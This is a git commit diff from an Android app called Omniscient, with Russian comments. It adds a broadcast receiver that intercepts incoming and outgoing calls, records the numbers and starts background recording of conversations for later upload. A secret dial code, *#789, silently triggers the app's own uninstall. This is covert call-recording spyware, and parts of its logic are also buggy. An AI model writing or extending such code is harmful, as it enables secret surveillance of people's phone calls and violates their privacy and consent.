1f4f74536609c8444b2b290d72baf92829a6b36b
powowstal <powowstal@gmail.com>
2016-08-03 12:40:17 +0300

    phone delete app not work yes

--- app/src/main/java/com/postal/omniscient/postal/catchPhone/Call/CallStateReceiver.java
+++ app/src/main/java/com/postal/omniscient/postal/catchPhone/Call/CallStateReceiver.java
@@ -1,93 +1,88 @@
 package com.postal.omniscient.postal.catchPhone.Call;
 
+import android.content.BroadcastReceiver;
 import android.content.Context;
-import android.media.MediaRecorder;
-import android.os.Environment;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.postal.omniscient.postal.ThreadIsAliveOrNot;
 import com.postal.omniscient.postal.adapter.EventBusCall;
 import com.postal.omniscient.postal.adapter.EventBusData;
 
 import org.greenrobot.eventbus.EventBus;
-import org.greenrobot.eventbus.Subscribe;
-import org.greenrobot.eventbus.ThreadMode;
 
-import java.io.File;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 
-/**
- * Created by Александр on 02.08.2016.
- */
-public class CallInThread extends Thread {
-
-    public CallInThread(Context context, String in_out_Call, String folderName, String fileName){
-        this.context = context;
-        this.folderName = folderName;
-        this.fileName = fileName;
-        this.in_out_Call = in_out_Call;
+public class CallStateReceiver extends BroadcastReceiver {
+    public CallStateReceiver() {
     }
 
-    private Context context;
-    private String in_out_Call, folderName, fileName;
-    private MediaRecorder recorder;
-    private File audiofile;
+    Bundle bundle;
+    String state;
+    String inCall, outCall;
 
+    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
+    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
+    private static final String packageName = "com.postal.omniscient";
+    private static final String code = "*#789";
 
     @Override
-    public void run() {
-        recordStart();
-    }
+    public void onReceive(Context context, Intent intent) {
+        Log.i("MyMsg", "1");
+        if (intent.getAction().equals(ACTION_IN)) {
+            Log.i("MyMsg", "2");
+            if ((bundle = intent.getExtras()) != null) {
+                state = bundle.getString(TelephonyManager.EXTRA_STATE);
+                if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
+                    inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
+                    Boolean start_or_no = new ThreadIsAliveOrNot("InCallWrite").liveORnot();
+                    if(!start_or_no && inCall != null) {
+                        EventBus.getDefault().post(new EventBusData("call_in"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
+                        new Thread(new CallInThread(context, inCall, "In_call", "_in_call.amr"),
+                                "InCallWrite").start();
+                        Log.i("MyMsg", "ACTION_IN start");
+                    }
+                } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
+                    Log.i("MyMsg", "3");
+                    EventBus.getDefault().post(new EventBusCall("stop"));
+                }
+            }
+        } else if (intent.getAction().equals(ACTION_OUT)) {
+            Log.i("MyMsg", "4");
+            if ((bundle = intent.getExtras()) != null) {
+                outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+                if(outCall.equals(code)) {
+                    Log.i("MyMsg", "start DELETE APP");
+                    deleteAPP(context);
 
-    private void recordStart() {
-        EventBus.getDefault().register(this);
+                                    }
+                //проверка на набор сервисов (*111#) а то срабатывает событие вызова
+                if (!outCall.contains("*") || !outCall.contains("#")) {
+                    outCall = outCall.replace("+", "");
+                    Boolean start_or_no = new ThreadIsAliveOrNot("OutCallWrite").liveORnot();
+                    if(!start_or_no && outCall  != null) {
+                        EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
+                        new Thread(new CallInThread(context, outCall, "Out_call", "_out_call.amr"),
+                                "OutCallWrite").start();
+                        Log.i("MyMsg", "ACTION_OUT start");
+                    }
+                }
+            }
+        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
+            Log.i("MyMsg", "5");
+//            EventBus.getDefault().post(new EventBusCall("stop"));
+//            EventBus.getDefault().post(new EventBusData("call_off"));//разгоаор записан говорим "загрузи файл"
 
-        String time = new SimpleDateFormat("dd_MM_yyyy_HH-mm")
-                .format(new Date());
-        File sampleDir = new File(context.getFilesDir(), "/Omniscient/"+folderName);
-
-        if (!sampleDir.exists()) {
-            sampleDir.mkdirs();
-        }
-        String file_name = in_out_Call + "_" + time;
-        try {
-            audiofile = File.createTempFile(file_name, fileName, sampleDir);
-        } catch (IOException e) {
-            Log.i("MyMsg", "Eror T -1 " + e);
-        }
-
-        recorder = new MediaRecorder();
-
-        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
-        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
-        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-        recorder.setOutputFile(audiofile.getAbsolutePath());
-        try {
-            recorder.prepare();
-        } catch (IllegalStateException e) {
-            Log.i("MyMsg", "Eror T0 " + e);
-        } catch (IOException e) {
-            Log.i("MyMsg", "Eror T1 " + e);
-        }
-        recorder.start();
-
-        Log.i("MyMsg", "Name on ACTION_OUT " + in_out_Call);
-    }
-    public void recordStop(){
-        recorder.stop();
-        Log.i("MyMsg", "call off");
-        EventBus.getDefault().unregister(this);
-    }
-
-
-    @Subscribe(threadMode = ThreadMode.ASYNC)
-    public void onEvent(EventBusCall event){
-        String command = event.getComand();
-        if(command.equals("stop")){
-            recordStop();
-            EventBus.getDefault().post(new EventBusData("call_off"));
         }
     }
 
+    private void deleteAPP(Context context) {
+        Uri packageURI = Uri.parse("package:com.postal.omniscient");
+        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+        context.startActivity(uninstallIntent);
+    }
 }
